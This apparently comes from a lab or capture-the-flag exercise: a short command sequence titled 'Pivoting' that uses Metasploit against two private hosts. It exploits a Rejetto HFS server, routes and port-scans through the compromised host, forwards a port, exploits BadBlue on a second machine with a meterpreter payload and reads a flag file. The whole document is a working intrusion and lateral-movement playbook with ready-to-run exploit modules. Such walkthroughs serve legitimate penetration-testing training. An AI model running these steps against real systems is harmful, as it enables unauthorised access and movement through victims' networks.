**Pivoting**

```
Victim Machine 1 : 10.0.18.105
Victim Machine 2 : 10.0.24.43
nmap -sVC 10.0.18.105
msfconsole -q
search hfs
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.18.105
run
shell
ctrl+z
run autoroute -s 10.0.18.0/20  #target 1 ip
run autoroute -p
background
search portscan
use  auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.24.43   #target 2 ip
set ports 1-100
run
sessions
sessions -i 1
portfwd add -l 4545 -p 80 -r 10.0.24.43
nmap -sVC -p 4545 localhost # new terminal
background
search badblue
use  exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
show options
set RHOSTS 10.0.24.43
set RHOST 10.0.24.43
run
shell
cd C:\
dir
type flag.txt
```
